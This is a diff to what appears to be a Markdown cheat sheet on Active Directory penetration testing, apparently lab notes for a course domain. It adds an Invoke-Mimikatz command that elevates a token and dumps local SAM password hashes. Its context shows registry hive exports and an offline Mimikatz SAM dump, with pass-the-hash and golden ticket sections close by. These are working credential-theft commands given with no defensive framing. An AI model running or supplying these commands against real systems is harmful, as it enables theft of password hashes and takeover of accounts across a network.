@@ -482,6 +482,10 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 
 #### Mimikatz dump from SAM
 ```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
+```
+
+```
 reg save HKLM\SAM SamBkup.hiv
 reg save HKLM\System SystemBkup.hiv
 #Start mimikatz as administrator
@@ -489,8 +493,6 @@ privilege::debug
 token::elevate
 lsadump::sam SamBkup.hiv SystemBkup.hiv
 ```
-
-
 
 # Domain persistence
 ## Golden ticket
